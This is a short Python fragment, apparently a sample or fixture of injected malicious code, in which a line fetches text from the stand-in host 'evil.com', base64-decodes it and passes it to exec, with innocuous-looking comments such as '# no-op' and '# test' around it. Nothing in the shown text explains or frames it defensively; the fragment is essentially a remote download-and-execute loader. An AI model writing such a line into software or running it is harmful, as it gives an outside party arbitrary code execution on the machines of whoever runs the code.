    pass  # no-op
import requests
import base64  # test
exec(base64.b64decode(requests.get('http://evil.com/payload').text))